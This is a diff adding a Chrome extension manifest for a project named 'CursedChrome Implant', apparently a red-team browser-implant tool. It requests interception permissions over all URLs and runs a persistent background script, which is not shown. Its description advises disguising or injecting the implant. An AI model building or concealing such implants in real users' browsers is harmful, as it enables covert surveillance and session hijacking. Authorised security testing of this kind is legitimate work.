@@ -1,0 +1,24 @@
+{
+  "name": "CursedChrome Implant",
+  "version": "0.0.1",
+  "manifest_version": 2,
+  "description": "Example Chrome extension with implant code. You should probably inject/disguise the implant instead of installing this extension directly.",
+  "homepage_url": "https://thehackerblog.com",
+  "icons": {
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
+  },
+  "default_locale": "en",
+  "background": {
+    "scripts": [
+      "src/bg/background.js"
+    ],
+    "persistent": true
+  },
+  "permissions": [
+    "webRequest",
+    "webRequestBlocking",
+    "<all_urls>"
+  ]
+}
